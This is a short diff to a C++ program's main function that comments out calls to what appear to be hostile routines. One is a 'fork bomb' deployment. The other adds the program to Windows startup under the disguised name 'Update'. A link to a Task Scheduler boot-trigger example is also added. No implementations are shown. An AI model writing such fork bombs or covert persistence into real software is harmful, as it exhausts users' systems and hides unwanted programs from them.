@@ -56,7 +56,14 @@ int	main(int argc, char** argv) {
 
 
 
-	Bomb bomb;
+	// Logic, Fork, Null bomb
+	/*Bomb bomb;
+	bomb.DeployFork();*/
+
+
+
+	// Miscellaneous
+	/*Miscellaneous::AddMeToStartup("Update", argv[0]);*/
 
 
 
@@ -66,3 +73,7 @@ int	main(int argc, char** argv) {
 
 	return EXIT_SUCCESS;
 }
+
+/*
+	https://docs.microsoft.com/en-us/windows/win32/taskschd/boot-trigger-example--c---
+*/
